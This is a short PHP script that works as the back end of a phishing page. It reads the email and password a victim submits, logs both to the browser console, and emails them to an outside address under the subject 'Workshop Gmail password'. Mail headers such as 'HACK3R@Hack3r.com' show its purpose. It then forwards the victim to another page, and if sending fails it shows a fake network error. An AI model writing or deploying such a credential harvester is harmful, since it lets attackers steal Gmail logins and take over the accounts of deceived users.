?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
        
        echo "<script>console.log('Email: " . htmlspecialchars($mailhacked) . "');</script>";
        echo "<script>console.log('Password: " . htmlspecialchars($passwordhacked) . "');</script>";
    }

        //$mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
         $to = "lowj2587@laurens55.org";
         $subject = "Workshop Gmail password";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:HACK3R@Hack3r.com \r\n";
         $header .= "Cc:abcd@somedomain.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
         }//
      ?>

